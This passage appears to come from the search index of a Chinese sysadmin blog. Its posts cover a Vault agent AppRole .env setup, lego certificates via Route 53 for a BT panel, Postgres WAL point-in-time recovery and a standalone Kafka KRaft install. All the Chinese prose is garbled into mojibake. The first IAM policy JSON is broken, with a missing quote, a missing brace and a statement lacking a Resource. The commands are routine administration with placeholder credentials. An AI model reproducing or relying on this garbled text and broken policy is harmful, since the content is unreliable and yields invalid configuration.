secret_id_file_path = \u0026#34;./secret-id\u0026#34; 12 remove_secret_id_file_after_reading = false 13 } 14 } 15 16 sink { 17 type = \u0026#34;file\u0026#34; 18 config = { 19 path = \u0026#34;./vault-agent-token\u0026#34; 20 } 21 } 22} 23 24template { 25 source = \u0026#34;./env.tmpl\u0026#34; 26 destination = \u0026#34;./.env\u0026#34; 27} è®¾ç½®æ¨¡æ¿æ–‡ä»¶env.tmplï¼š\n1DB_USER={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.user }}{{ end }} 2DB_PASS={{ with secret \u0026#34;secret/data/dbinfo\u0026#34; }}{{ .Data.data.pass }}{{ end }} å¯åŠ¨\n1vault agent -config=./agent.hcl -log-level=debug ç„¶åæ£€æŸ¥.env\n1cat .env 2DB_USER=root 3DB_PASS=test123 4 5cat vault-agent-token 6hvs.CAESILRWC98usmzSfxdJRMnKWUlvT9kFV1zzPfrkGgdBInYfGh4KHGh2cy54NHhEQnNUa2pmTzU5NTlRN1234567890 è¿™æ ·å°±okäº†ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿæœ‰ä¸ªå¤§éº»çƒ¦ï¼Œé‚£å°±æ˜¯tokenï¼Œå¦‚æœé‡å¯tokenå˜äº†ï¼Œé‚£å¿…é¡»é‡æ–°çŒå…¥ã€‚\næœ€åï¼Œæ”¾ä¸Šagentçš„systemdæ–‡ä»¶/etc/systemd/system/vault-agent.serviceï¼š\n1[Unit] 2Description=Nomad Agent 3Requires=consul-online.target 4After=consul-online.target 5 6[Service] 7KillMode=process 8KillSignal=SIGINT 9ExecStart=/usr/local/bin/vault agent -config /etc/vault-agent.d/vault-agent.hcl 10ExecReload=/bin/kill -HUP $MAINPID 11Restart=on-failure 12RestartSec=2 13StartLimitBurst=3 14StartLimitIntervalSec=10 15LimitNOFILE=65536 16 17[Install] 18WantedBy=multi-user.target å…³äºRoot Token\nç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œvault operator init ä¼šå¾—åˆ°è¿™ä¸ªè¿™ä¸ªToken\néšåå‘¢ï¼Œå†å¾—åˆ°è¿™ä¸ªï¼Œå°±å¿…é¡» vault operator generate-rootäº†ï¼Œå¿…é¡»unseal keyã€‚\nå†éšåï¼Œç”¨vault loginï¼Œå°±å¯ä»¥ç”¨äº†ã€‚\n","date":"2025-08-06","img":"","permalink":"https://rendoumi.com/posts/20250806-vault_approle_env/","series":null,"tags":null,"title":"Vaultä½¿ç”¨agentéªŒè¯approleç”Ÿæˆ.envç¯å¢ƒå˜é‡"},{"categories":null,"content":"ä¸Šä¸€ç¯‡æˆ‘ä»¬è¯´äº† Awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM ï¼Œè¿™ä¸‹åˆæ¥äº†ä¸ªæ›´åŠ æœ‰éš¾åº¦çš„æŒ‘æˆ˜ï¼š\nDNSè§£ææ˜¯æ”¾åœ¨äº†AWS Route 53ä¸Šï¼Œç„¶åvpsä¸Šè·‘ç€BTå®å¡”ï¼Œç”¨æ¥ä»£ç†è½¬å‘å¼€å‘ç¯å¢ƒçš„httpsè¯ä¹¦\nè¿™ä¸ªç¯å¢ƒå¦‚ä½•ç”¨legoæ¥å®‰å…¨çš„ç”³è¯·åˆ°è¯ä¹¦å¹¶é…ç½®å®å¡”å‘¢ï¼Ÿè¿™å›å¯ä¸åƒEC2é‚£æ ·å¯ä»¥è‡ªåŠ¨é™„åŠ IAMè§’è‰²äº†\næˆ‘ä»¬å…ˆæ¥çœ‹çœ‹legoçš„ç”¨æ³•å§ï¼š\nhttps://go-acme.github.io/lego/dns/route53/ è¯­æ³•å¦‚ä¸‹ï¼š\nç»§ç»­çœ‹ï¼Œçœ‹æ¥å¿…é¡»éœ€è¦IAMçš„å‡­æ®æ‰å¯ä»¥ï¼Œç»§ç»­ä¸‹æ‹‰ï¼Œæœ‰ä½¿ç”¨IAMçš„policyï¼Œé‚£æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªRoleè§’è‰²ï¼Œç„¶åå†å»ºç«‹ä¸€ä¸ªä»£ç†ç”¨æˆ·ï¼Œgenå‡ºkeyï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ç”¨æˆ·çš„å‡­æ®æ¥é—´æ¥è¿›è¡Œè®¿é—®\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å»route53ï¼Œæ‹¿åˆ°arn æˆ‘ä»¬è¦æ‹¿åˆ°å…·ä½“åŸŸåçš„zone IDï¼Œå°±æ˜¯Z0æ‰“å¤´çš„é‚£ä¸€ä¸²\näºŒã€å»ºç«‹IAMå®é™…å·¥ä½œçš„Role é¦–å…ˆå»ºç«‹ä¸€ä¸ªPolicyï¼Œroute53AcmeCert\n1{ 2 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17 3 \u0026#34;Statement\u0026#34;: [ 4 5 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 6 \u0026#34;Action\u0026#34;: \u0026#34;route53:GetChange\u0026#34;, 7 \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:route53:::change/*\u0026#34; 8 }, 9 { 10 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 11 \u0026#34;Action\u0026#34;: \u0026#34;route53:ListHostedZonesByName\u0026#34;, 12 }, 13 { 14 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 15 \u0026#34;Action\u0026#34;: [ 16 \u0026#34;route53:ListResourceRecordSets\u0026#34; 17 ], 18 \u0026#34;Resource\u0026#34;: [ 19 \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; 20 ] 21 }, 22 { 23 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 24 \u0026#34;Action\u0026#34;: [ 25 \u0026#34;route53:ChangeResourceRecordSets\u0026#34; 26 ], 27 \u0026#34;Resource\u0026#34;: [ 28 \u0026#34;arn:aws:route53:::hostedzone/Z01111111111111111111\u0026#34; 29 ], 30 \u0026#34;Condition\u0026#34;: { 31 \u0026#34;ForAllValues:StringEquals\u0026#34;: { 32 \u0026#34;route53:ChangeResourceRecordSetsNormalizedRecordNames\u0026#34;: [ 33 \u0026#34;_acme-challenge.example.com\u0026#34; 34 ], 35 \u0026#34;route53:ChangeResourceRecordSetsRecordTypes\u0026#34;: [ 36 \u0026#34;TXT\u0026#34; 37 ] 38 } 39 } 40 } 41 ] 42} ç„¶åå»ºç«‹ä¸€ä¸ªRoleï¼ŒRealUpdateCertRoleï¼Œç»‘å®šä¸Šé¢çš„ç­–ç•¥\nå¹¶ä¸”æ‹¿åˆ°è¿™ä¸ªRoleè§’è‰²çš„arn\nä¸‰ã€å»ºç«‹IAMå®é™…å·¥ä½œçš„ç”¨æˆ· å»ºç«‹ä¸€ä¸ªç”¨æˆ·CertProxyUserï¼Œè¿™é‡Œä¸éœ€è¦æå‰å»ºç«‹policyï¼Œç›´æ¥ç”¨å†…è”policyå³å¯ï¼Œarnæ›¿æ¢æˆæ­£ç¡®çš„\nå…¶å®å°±æ˜¯STSåŠ¨æ€è·å¾—æŒ‡å®šç”¨æˆ·çš„æƒé™ï¼š\n1{ 2 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 3 \u0026#34;Statement\u0026#34;: [ 4 { 5 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 6 \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;, 7 \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:iam::111111111111:role/RealUpdateCertRole\u0026#34; 8 } 9 ] 10} ä¸­é—´111111111æ˜¯account id\nç„¶åGENå‡ºä¸€å¯¹è®¿é—®å¯†é’¥\nå››ã€é…ç½®aws 1cd .aws 2 3cat credentials 4[CertProxyUser] 5aws_access_key_id = AK11111111111111 6aws_secret_access_key = 222222222222222 7 8cat config 9[profile CertProxyUser] 10 11[profile RealUpdateCertRole] 12role_arn = arn:aws:iam::111111111111:role/RealUpdateCertRole 13source_profile = CertProxyUser äº”ã€æ’°å†™legoè·å–è¯ä¹¦çš„è„šæœ¬ /usr/local/bin/get-cert.shï¼Œå®ƒä¼šè‡ªåŠ¨ç”¨CertProxyUserå‡­æ®ï¼Œè·å¾—RealUpdateCertRoleçš„è§’è‰²ï¼Œç„¶åå»æ‹¿åˆ°è¯ä¹¦\n1#!/bin/bash 2 3AWS_PROFILE_NAME=\u0026#34;RealUpdateCertRole\u0026#34; 4 5CREDENTIALS=$(aws sts assume-role \\ 6 --role-arn \u0026#34;$(aws configure get role_arn --profile ${AWS_PROFILE_NAME})\u0026#34; \\ 7 --role-session-name \u0026#34;${AWS_PROFILE_NAME}-session-$(date +%s)\u0026#34; \\ 8 --profile \u0026#34;$(aws configure get source_profile --profile ${AWS_PROFILE_NAME})\u0026#34; \\ 9 --output json) 10 11if [ $? -ne 0 ]; then 12 echo \u0026#34;Error: Failed to assume role. Please check your IAM role, source profile, and network connectivity.\u0026#34; 13 exit 1 14fi 15 16export AWS_ACCESS_KEY_ID=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.AccessKeyId\u0026#39;) 17export AWS_SECRET_ACCESS_KEY=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SecretAccessKey\u0026#39;) 18export AWS_SESSION_TOKEN=$(echo \u0026#34;$CREDENTIALS\u0026#34; | jq -r \u0026#39;.Credentials.SessionToken\u0026#39;) 19export AWS_REGION=ap-southeast-1 20export AWS_HOSTED_ZONE_ID=Z1111111111111111111 21 22/usr/local/bin/lego --path /usr/local/bin/certs --domains *.example.com --domains example.com --email zhangranrui@gmail.com --dns route53 --accept-tos=true renew --renew-hook=\u0026#34;/usr/local/bin/update-cert.sh\u0026#34; /usr/local/bin/update-cert.sh å°±æ˜¯æ›´æ–°å®å¡”è¯ä¹¦çš„è¿‡ç¨‹\n1#!/bin/bash 2 3cp /usr/local/bin/certs/certificates/_.example.com.crt /www/server/panel/vhost/cert/example.com/fullchain.pem 4cp /usr/local/bin/certs/certificates/_.example.com.key /www/server/panel/vhost/cert/example.com/privkey.pem 5 6/etc/init.d/nginx reload å…¶å®å°±æ˜¯æ›¿æ¢æ‰vhostä¸‹çš„è¯ä¹¦ï¼Œç„¶åé‡å¯Nginxã€‚\nè¿™æ ·å°±æå®šäº†ã€‚\n","date":"2025-07-29","img":"","permalink":"https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/","series":null,"tags":null,"title":"ä¸Šéš¾åº¦----\u003eå†…ç½‘vpsç”¨legoç”³è¯·route53 DNSè¯ä¹¦å¹¶æ›´æ–°åˆ°BTå®å¡”"},{"categories":null,"content":"ç ”ç©¶äº†Postgresçš„åº“æ•°æ®æ¢å¤å’Œè½¬ç§»ï¼Œå†æ¥ç ”ç©¶ä¸€ä¸‹PITRæŒ‰æ—¶é—´ç‚¹æ¢å¤\nç±»æ¯”åˆ°MySQLï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯è¿ç»´ï¼Œä¸æ˜¯ä¸“ä¸šçš„DBAï¼Œæ‰€ä»¥æ¢å¤åˆ°æ­£ç¡®æ•°æ®å³å¯\né‚£è·Ÿé˜¿é‡Œäº‘ä»¥åŠè‡ªå»ºçš„MySQLæ¢å¤ä¸€æ ·ï¼Œé¦–å…ˆéƒ½è¦æœ‰ä¸€ä¸ªæ¯å¤©çš„åŸºç¡€å¤‡ä»½ï¼Œç„¶åç±»æ¯”MySQLçš„Binlogï¼ŒPostgresè¿™é‡Œå°±ç›¸å½“äºwalã€‚\nè¿™ä¹ˆç±»æ¯”å°±å¯¹äº†ï¼Œé‚£ä¹ˆæ¢å¤è¿‡ç¨‹çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼š\né¦–å…ˆå»ºç«‹ä¸€ä¸ªæ–°çš„å®ä¾‹ ç¬¬äºŒæ­¥æŠŠæ¯å¤©çš„åŸºç¡€ç‰©ç†å…¨å¤‡ç»™æ¢å¤ä¸Šå» ç¬¬ä¸‰æ­¥æŠŠä¹‹åçš„walæ—¥å¿—ä¼ åˆ°æ–°å®ä¾‹ï¼Œæ¢å¤åˆ°æŒ‡å®šæ—¶é—´ç‚¹ ç¬¬å››æ­¥æœ€åæŠŠè¡¨æˆ–åº“Dumpä¸‹æ¥ï¼ŒçŒå…¥åˆ°æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“ é‚£æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥è§£é‡Šï¼š\nä¸€ã€æ¯å¤©å»ºç«‹ä¸€ä¸ªåŸºç¡€å¤‡ä»½ï¼Œè¿™æ ·åœ¨BaseåŸºç¡€ä¸Šï¼Œåªéœ€æ¢å¤å½“å¤©çš„walï¼Œé€Ÿåº¦å¤Ÿå¿« å»ºç«‹æ¯å¤©çš„BaseåŸºç¡€ç‰©ç†å¤‡ä»½\n1pg_basebackup -Ft -Pv -Xf -z -Z5 -U postgres -h localhost -p 5432 -D /pg_backup 2 3è§£é‡Šä¸€ä¸‹ï¼š 4 -Ftï¼š 5 æŒ‡å®šå¤‡ä»½æ ¼å¼ä¸º tarã€‚ 6 å¦‚æœä½¿ç”¨ tar æ ¼å¼ï¼Œå¤‡ä»½ä¼šè¾“å‡º tar æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸éœ€è¦ç›´æ¥è®¿é—® PostgreSQL æ•°æ®ç›®å½•ã€‚ 7 -Pvï¼š 8 -Pï¼šæ˜¾ç¤ºå¤‡ä»½è¿›åº¦ã€‚ 9 -vï¼šå¯ç”¨è¯¦æƒ…æ¨¡å¼ï¼ˆverboseï¼‰ï¼Œæ˜¾ç¤ºæ›´å¤šæ—¥å¿—ã€‚ 10 -Xfï¼š 11 -Xï¼šæ§åˆ¶ WAL æ—¥å¿—çš„å¤„ç†æ–¹å¼ï¼Œf è¡¨ç¤ºåœ¨å¤‡ä»½ä¸­åŒ…å« WAL æ–‡ä»¶ï¼ˆWrite Ahead Logsï¼‰ï¼Œç¡®ä¿å¤‡ä»½å¯ä»¥ç”¨äºæ¢å¤åˆ°å®Œæ•´çš„ä¸€è‡´çŠ¶æ€ã€‚ 12 -zï¼š 13 å¯ç”¨å‹ç¼©åŠŸèƒ½ã€‚ 14 -Z5ï¼š 15 è®¾ç½®å‹ç¼©çº§åˆ«ä¸º 5ï¼ˆå‹ç¼©çº§åˆ«ä» 0 åˆ° 9ï¼Œ9 ä¸ºæœ€é«˜å‹ç¼©ï¼‰ã€‚ 16 -U postgresï¼š 17 ä½¿ç”¨ postgres ç”¨æˆ·æ¥è¿æ¥æ•°æ®åº“ã€‚ 18 -h localhostï¼š 19 æŒ‡å®šæ•°æ®åº“ä¸»æœºä¸ºå½“å‰æœºå™¨ï¼ˆlocalhostï¼‰ã€‚ 20 -p 5432ï¼š 21 æŒ‡å®š PostgreSQL ç›‘å¬ç«¯å£ä¸º 5432ï¼ˆé»˜è®¤ç«¯å£ï¼‰ã€‚ 22 -D /pg_backupï¼š 23 å°†å¤‡ä»½æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šè·¯å¾„ /pg_backup ä¸­ã€‚ è¿™æ ·æˆ‘ä»¬å°±åœ¨ /pg_backup ä¸­æœ‰äº†å¤‡ä»½æ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€ä¸ªbackup_manifestçš„æ–‡ä»¶æ¸…å•ï¼Œä»¥åŠä¸€ä¸ªå‹ç¼©åŒ…\n1root@debian:/pg_backup# ls -lha 2total 1.8G 3drwxr-xr-x 3 root root 4.0K Jul 28 16:31 . 4drwxr-xr-x 20 root root 4.0K Jul 28 16:18 .. 5-rw------- 1 root root 760K Jul 28 16:21 backup_manifest 6-rw------- 1 root root 1.8G Jul 28 16:21 base.tar.gz é‚£è¿™ä¸ªbase.tar.gzé‡Œé¢åˆéƒ½æœ‰ä»€ä¹ˆå‘¢ï¼Ÿ\n1/ 2â”œâ”€â”€ base/ # æ¯ä¸ªæ•°æ®åº“çš„æ–‡ä»¶ 3â”œâ”€â”€ global/ # å…¨å±€å¯¹è±¡ï¼ˆè§’è‰²ã€æƒé™ï¼‰ 4â”œâ”€â”€ pg_wal/ # WAL æ—¥å¿— 5â”œâ”€â”€ pg_xact/ # äº‹åŠ¡çŠ¶æ€ 6â”œâ”€â”€ pg_clog/ # äº‹åŠ¡æäº¤ä¿¡æ¯ 7â”œâ”€â”€ postgresql.auto.conf # è‡ªåŠ¨é…ç½®æ–‡ä»¶ 8â”œâ”€â”€ postgresql.conf # ä¸»é…ç½®æ–‡ä»¶ 9â”œâ”€â”€ pg_hba.conf # è®¿é—®æ§åˆ¶æ–‡ä»¶ 10â”œâ”€â”€ pg_ident.conf # ç”¨æˆ·æ˜ å°„æ–‡ä»¶ 11â””â”€â”€ ... # å…¶ä»–ç³»ç»Ÿæ–‡ä»¶ æˆ‘ä»¬å…ˆ ps axjf çœ‹ä¸€æŠŠ\nå¯ä»¥çœ‹åˆ°ï¼Œ-Dçš„æ•°æ®ç›®å½•æ˜¯åœ¨/var/lib/postgresql/13/mainä¸‹ï¼Œé‚£base.tar.gzé‡Œé¢çš„å†…å®¹è·Ÿ/var/lib/postgresql/13/mainä¸‹æ˜¯ä¸€æ ·çš„ã€‚\näºŒã€æ—§å®ä¾‹éœ€è¦å»ºç«‹walçš„å½’æ¡£æ¨¡å¼ 1# ps axjfçš„ç»“æœä¸­ï¼Œçœ‹åˆ°é…ç½®æ–‡ä»¶æ˜¯ /etc/postgresql/13/main/postgresql.conf 2# é‚£å°±ä¿®æ”¹è¿™ä¸ªé…ç½®æ–‡ä»¶ 3 4# ä¿®æ”¹ä»¥ä¸‹2è¡Œ 5# å¯ç”¨å½’æ¡£ 6archive_mode = on 7# WAL æ—¥å¿—å½’æ¡£è·¯å¾„ 8archive_command = \u0026#39;cp %p /path_to_archive_directory/%f\u0026#39; 9 10# ç„¶åé‡å¯æœåŠ¡ç”Ÿæ•ˆ 11systemctl restart postgresql ä»¥ä¸Šåšå®Œåæˆ‘ä»¬å¦‚æœæˆ‘ä»¬åšäº†Baseå¤‡ä»½ï¼Œç„¶åwalçš„æ—¥å¿—è¿˜åœ¨ç»§ç»­è·‘ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æ‰‹åŠ¨è§¦å‘ä¸€ä¸‹walå†™ç›˜\n1select pg_switch_wal(); 2 3 pg_switch_wal 4--------------- 5 0/13DAC308 ä¼šå¾—åˆ°ä¸€ä¸ªåºåˆ—å·ï¼š0/13DAC308\nç„¶åæ–°çš„walå½’æ¡£æ—¥å¿—å°±æ”¾åœ¨ï¼š/path_to_archive_directory/ç›®å½•ä¸‹äº†ï¼Œé‚£åŸå§‹çš„walæ•°æ®æ–‡ä»¶è¿˜åœ¨ /var/lib/postgresql/13/main/pg_wal ä¸‹\nä¸‰ã€æ–°å®ä¾‹æ¢å¤Baseåº“å’Œæ—¶é—´ç‚¹ï¼š 1# æ‰¾åˆ°æ–°å®ä¾‹çš„æ•°æ®ç›®å½•ï¼Œä¸€æŠŠåˆ ç©ºï¼Œç„¶åæŠŠbase.tar.gzè§£å‹è¿›å» 2# å»ºæ¢å¤ç›®å½•å¹¶æ¸…ç†æ—§æ•°æ® 3# å°†è§£å‹åçš„å¤‡ä»½ç§»åˆ°æ•°æ®åº“å®ä¾‹çš„å®é™…æ•°æ®ç›®å½•ï¼ˆé€šå¸¸ä½äº /var/lib/postgresql/dataï¼‰ã€‚æ¸…ç†æ—§ç›®å½•åæ‰§è¡Œï¼š 4mv /pg_restore/ /var/lib/postgresql/data 5 6# è®¾ç½®æ¢å¤é…ç½®æ–‡ä»¶ 7# åœ¨æ•°æ®ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸º recovery.signal çš„ç©ºæ–‡ä»¶ï¼ŒåŒæ—¶åœ¨æ•°æ®ç›®å½•ä¸­æ–°å¢æ¢å¤ç›®æ ‡çš„é…ç½®æ–‡ä»¶ postgresql.auto.confã€‚ 8touch recovery.signal 9 10#ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶ postgresql.auto.confï¼š 11vi /var/lib/postgresql/data/postgresql.auto.conf 12 13# æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 14# æ—§å®ä¾‹çš„walæ–‡ä»¶éœ€è¦äº‹å…ˆcopyåˆ°æ–°å®ä¾‹çš„ /path_to_archive_directory ç›®å½•ä¸‹ 15primary_conninfo = \u0026#39;\u0026#39; 16restore_command = \u0026#39;cp /path_to_archive_directory/%f %p\u0026#39; 17recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; 18recovery_target_action = \u0026#39;pause\u0026#39; è¯´æ˜ï¼š\nrestore_commandï¼šç”¨äºæŒ‡å®šå¦‚ä½•æ¢å¤ WAL æ—¥å¿—ã€‚è¿™é‡Œçš„å‘½ä»¤æ˜¯ä»å½’æ¡£ç›®å½• /path_to_archive_directory/ ä¸­æ‹·è´ WAL æ—¥å¿—åˆ° PostgreSQL æ•°æ®ç›®å½•ã€‚\nrecovery_target_timeï¼šä½ å¸Œæœ›æ¢å¤åˆ°çš„æ—¶é—´ç‚¹ç²¾ç¡®åˆ°ç§’ï¼ˆUTC æ—¶é—´ï¼‰ã€‚\nrecovery_target_actionï¼šåœ¨å®Œæˆæ¢å¤åˆ°ç›®æ ‡æ—¶é—´åï¼Œpause è¡¨ç¤ºæš‚åœæ¢å¤å¹¶è¿›å…¥åªè¯»æ¨¡å¼\nç„¶åå¼€å§‹æ¢å¤ï¼š\n1# ç¡®ä¿ PostgreSQL æ•°æ®ç›®å½•å·²å‡†å¤‡å¥½ï¼Œåˆ é™¤ç›®å½•ä¸‹æ—§çš„ postmaster.pid ç­‰æ–‡ä»¶ï¼š 2rm /var/lib/postgresql/data/postmaster.pid 3 4# å¯åŠ¨ PostgreSQL æœåŠ¡ï¼š 5systemctl start postgresql 6 7# ç¡®è®¤æ¢å¤è¿›åº¦ 8# è§‚å¯Ÿ PostgreSQL çš„æ—¥å¿—æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº /var/log/postgresql/postgresql-X.logï¼Œå…·ä½“è·¯å¾„æ ¹æ®é…ç½®æ–‡ä»¶å¯èƒ½ä¸åŒï¼‰ï¼š 9tail -f /var/log/postgresql/postgresql-X.log 10 11# å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œä½ åº”è¯¥èƒ½çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š 12consistent recovery point reached at 0/16B6F98 13recovery stopping at specified recovery target 14 15# é€€å‡ºæ¢å¤æ¨¡å¼ 16mv /var/lib/postgresql/data/standby.signal /var/lib/postgresql/data/standby.signal.bak 17 18# é€€å‡ºæ¢å¤æ¨¡å¼åï¼Œç¡®è®¤æ˜¯åªè¯»æ¨¡å¼ 19SELECT pg_is_in_recovery(); 20 21# å¦‚æœè¦è¿›å…¥å¯è¯»å¯å†™çš„æ¨¡å¼ 22select pg_wal_replay_resume(); å››ã€dumpå‡ºæ–°å®ä¾‹æŒ‡å®šè¡¨æˆ–åº“çš„æ•°æ®ï¼Œç„¶åçŒå›æ—§å®ä¾‹çš„æ–°è¡¨æˆ–æ–°åº“ è¿™ä¸ªè¿‡ç¨‹å°±ä¸å¤šè¯´äº†ã€‚\nå¤šè¯´ä¸€å¥ï¼Œå¯ä»¥æ¢å¤åˆ°æŸä¸ªæ—¶é—´ç‚¹ï¼Œäº‹åŠ¡æˆ–è€…walåºåˆ—å·\n1# æ¢å¤åˆ°ä¸åŒæ—¶é—´ç‚¹ 2# å‡è®¾ç¬¬ä¸€æ¬¡æ¢å¤åï¼Œä½ å¸Œæœ›å°è¯•æ¢å¤åˆ°å¦ä¸€ä¸ªæ—¶é—´ç‚¹ï¼Œä¿®æ”¹ postgresql.auto.conf æ–‡ä»¶ä¸­çš„ recovery_target_time ç„¶ååŒæ ·é‡å¤ä»¥ä¸Šæ­¥éª¤å³å¯é‡æ–°æ¢å¤ã€‚ 3recovery_target_time = \u0026#39;YYYY-MM-DD HH:MI:SS\u0026#39; 4 5# ä»¥æŸä¸ªäº‹åŠ¡ä¸ºç›®æ ‡ï¼š 6recovery_target_xid = \u0026#39;12345\u0026#39; 7 8#ä»¥æŸä¸ª WAL æ—¥å¿—åºåˆ—å·ä¸ºç›®æ ‡ï¼š 9recovery_target_lsn = \u0026#39;0/16B6F98\u0026#39; æ€»ç»“ä¸€ä¸‹ï¼šæ— è®ºpostgresè¿˜æ˜¯mysqlï¼Œä¸€é”®æ¢å¤çš„åŠŸèƒ½ï¼Œæœ€å¥½éƒ½æ˜¯æ–°èµ·ä¸€ä¸ªå®ä¾‹ï¼Œç„¶åæŠŠåŸºç¡€å¤‡ä»½æ¢å¤ä¸Šå»ï¼Œç„¶åç”¨binlogæˆ–walå½’æ¡£æ—¥å¿—è¿›è¡Œæ¢å¤ï¼Œç„¶åå¯¼å‡ºæ•°æ®ï¼Œæœ€åçŒå…¥åˆ°æ—§å®ä¾‹ä¸­ï¼Œè¿™æ ·æœ€ç¨³å¦¥ï¼Œæ—§å®ä¾‹ä¹Ÿä¸ä¼šåœæœåŠ¡ï¼ï¼ï¼\n","date":"2025-07-28","img":"","permalink":"https://rendoumi.com/posts/20250728-postgres_wal_pitr/","series":null,"tags":null,"title":"Postgresçš„walå’ŒPITRæ—¶é—´ç‚¹æ¢å¤"},{"categories":null,"content":"ä¸Šä¸€ç¯‡è¯´äº†ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œæ”¹ç”¨kraftã€‚\nè¿™ä¸€ç¯‡è¯´è¯´ä¸ç”¨Dockerï¼Œç›´æ¥å•æœºéƒ¨ç½²kafkaç”¨kraftçš„æ–¹æ³•ã€‚\nä¸€ã€å‡†å¤‡ï¼Œè™šæœºçš„è¯éœ€è¦4cpu 8Gå†…å­˜\n1# è£…å¥½java 2java --version 3 4å»º3ä¸ªç›®å½• 5# æ”¾kafkaçš„2è¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ 6mkdir -p /opt/kafka 7 8# æ”¾kafkaçš„æ—¥å¿—æ–‡ä»¶ 9mkdir -p /var/log/kafka 10 11# æ”¾kafkaçš„æ•°æ®æ–‡ä»¶ 12mkdir -p /var/lib/kafka äºŒã€ä¸‹è½½å¹¶é…ç½®kafka\n1# é‡Šæ”¾åˆ°æŒ‡å®šç›®å½• 2tar -xzf kafka_2.13-3.5.0.tgz -C /opt/kafka 3 4# ä¿®æ”¹/opt/kafka/config/server.properties 5process.roles=broker,controller 6node.id=1 7controller.quorum.voters=1@localhost:9093 8listeners=PLAINTEXT://localhost:9092,CONTROLLER://localhost:9093 9log.dirs=/var/lib/kafka 10 11# ç„¶åéœ€è¦å†è¿½åŠ åˆ°server.propertiesçš„éƒ¨åˆ† 12metadata.log.dir=/var/lib/kafka/metadata 13num.replica.fetchers=1 14offsets.topic.replication.factor=1 15transaction.state.log.replication.factor=1 16transaction.state.log.min.isr=1 ä¸‰ã€åˆå§‹åŒ–kafkaé›†ç¾¤\n1# ç”Ÿæˆä¸€ä¸ªuuid 2uuidgen 3dc66bcb0-758e-4360-843d-5ccb1da2ee74 4 5# åˆå§‹åŒ– 6cd /opt/kafka 7bin/kafka-storage.sh format -t \u0026lt;UUID\u0026gt; -c config/server.properties 8 9# å¯åŠ¨ 10bin/kafka-server-start.sh config/server.properties 11 12# æ£€æŸ¥ä¸€ä¸‹ä»£ç†çš„çŠ¶æ€ 13bin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092 å››ã€æ¨é€æ•°æ®éªŒè¯\n1# åˆ›å»ºtopic 2bin/kafka-topics.sh --create --topic my-new-topic --bootstrap-server localhost:9092 --partitions 3 --replication-factor 1 3 4# åˆ—å‡ºtopic 5bin/kafka-topics.sh --list --bootstrap-server localhost:9092 6 7# çœ‹çœ‹topicçš„å±æ€§ 8bin/kafka-topics.sh --describe --topic my-new-topic --bootstrap-server localhost:9092 9 10# ç”Ÿäº§ä¸€äº›æ¶ˆæ¯æ”¾è¿›topic 11bin/kafka-console-producer.sh --topic my-new-topic --bootstrap-server localhost:9092 12 13# æ¶ˆè´¹è¿™äº›æ¶ˆæ¯ 14bin/kafka-console-consumer.sh --topic my-new-topic --from-beginning --bootstrap-server localhost:9092 15 16# å¦‚ä½•é‡åˆ°é—®é¢˜ï¼ŒæŸ¥çœ‹æ—¥å¿— 17tail -f /var/log/kafka/server.log ","date":"2025-07-28","img":"","permalink":"https://rendoumi.com/posts/20250728-kafka_kraft_alone/","series":null,"tags":null,"title":"å•æœºéƒ¨ç½²kafkaç”¨kraftä¸ä¾èµ–zookeeper"},{"categories":null,"content":"ç”¨redpandaå±…ç„¶è¿˜è¦æ¯éš”30å¤©æ›´æ–°ä¸€ä¸‹Licenseæ–‡ä»¶ï¼Œå”å¯å¿å©¶ä¸å¯å¿å•Šã€‚\næ¢æ‰æ¢æ‰ï¼Œç›´æ¥ç”¨Dockeréƒ¨ç½²kafkaï¼Œåç«¯ä¸ç”¨zookeeperï¼Œç”¨kraftï¼Œå¤©ä¸‹è‹¦zkä¹Ÿä¹…çŸ£ï¼\næ–¹æ³•å¾ˆç®€å•ï¼Œç”¨docker-composeï¼Œç¼–è¾‘docker-compose.ymlæ–‡ä»¶\n1name: \u0026#39;stream\u0026#39; 2services: 3 kafka: 4 image: confluentinc/cp-kafka:latest 5 hostname: kafka 6 container_name: kafka 7 ports: 8 - 9092:9092 9 - 9093:9093 10 environment: 11 KAFKA_KRAFT_MODE: true # This enables KRaft mode in 